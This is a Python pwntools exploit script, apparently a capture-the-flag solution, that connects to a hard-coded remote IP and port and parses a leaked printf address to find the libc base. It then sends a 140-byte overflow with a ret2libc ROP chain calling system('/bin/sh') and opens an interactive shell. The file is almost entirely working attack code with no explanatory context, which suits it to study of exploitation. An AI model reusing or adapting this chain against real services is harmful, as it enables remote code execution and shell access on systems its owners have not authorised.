from pwn import *
from pwnlib.util.packing import p64

def generate_payload_aligned(rop):
    payload1 = OFFSET + rop
    if (len(payload1) % 16) == 0:
        return payload1
    
    else:
        payload2 = OFFSET + p64(RET) + rop
        if (len(payload2) % 16) == 0:
            log.info("Payload aligned successfully")
            return payload2
        else:
            log.warning(f"I couldn't align the payload! Len: {len(payload1)}")
            return payload1

conn = remote('172.104.14.64',54732)
conn.recvline()
printf_addr=int(conn.recvline().decode("utf-8")[10:-1],0)
print("printf at "+str(printf_addr))
libc = ELF("./libc-2.23.so")
LOCAL_BIN = "./arm"
ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

if libc != "":
    libc.address = printf_addr - libc.symbols['printf'] #Save libc base
    log.info("libc base @ %s" % hex(libc.address))

BINSH = next(libc.search(b'/bin/sh')) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

OFFSET = b"A"*140
print(libc.plt)
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (ROP_LOADED.find_gadget(['ret']))[0]
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))

rop2 = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) #p64(EXIT)
rop2 = generate_payload_aligned(rop2)
print(rop2)
conn.sendline(rop2)
conn.interactive()